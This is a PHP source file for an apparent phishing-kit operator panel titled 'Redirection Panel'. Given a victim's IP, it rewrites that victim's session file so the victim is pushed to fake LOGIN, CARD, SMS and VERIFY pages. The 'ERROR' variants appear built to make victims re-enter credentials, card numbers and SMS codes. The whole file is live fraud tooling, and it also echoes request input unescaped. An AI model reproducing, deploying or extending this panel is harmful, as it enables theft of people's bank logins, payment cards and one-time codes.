<?php 
require 'panel.class.php';
$pnl = new Panel();

if(isset($_GET['page'], $_GET['ip'])){
    $pnl->editVicFIle($_GET['page'], $_GET['ip']);
    header("location: ctr.php?ip=".$_GET['ip']."&redirected");
}
?>
<!doctype html>
<html>
<head>
<title>Redirection Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="res/style.css">
</head>
<body>

<div class="btns">
<?php 


if(isset($_GET['redirected'])){
    echo "<h1>Redirected!</h1>";
}

if(isset($_GET['uploaded'])){
    echo "<h1>FILE UPLOADED!</h1>";
}
 
if(isset($_GET['updated'])){
    echo "<h1>DATA UPDATED!</h1>";
}
 

?>

<form>
    <span>[<?php echo @$_GET['ip'];?>] </span>
</form>

<form action="ctr.php" method="get">
    <h3 style="color:white;">Control options</h3>
    <input type="hidden" name="ip" value="<?php echo @$_GET['ip'];?>">
     <button type="submit" name="page" value="login.php">LOGIN</button>
    <button type="submit" name="page" value="login.php?e" style="background:red;">LOGIN ERROR</button>
    <button type="submit" name="page" value="card.php">CARD</button>
    <button type="submit" name="page" value="card.php?e" style="background:red;">CARD ERROR</button>
    <button type="submit" name="page" value="sms.php">SMS</button>
    <button type="submit" name="page" value="sms.php?e" style="background:red;">SMS ERROR</button>
	<button type="submit" name="page" value="verify.php">VERIFY</button>
    <button type="submit" name="page" value="exit.php">EXIT</button>
</form>


</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</body>
</html>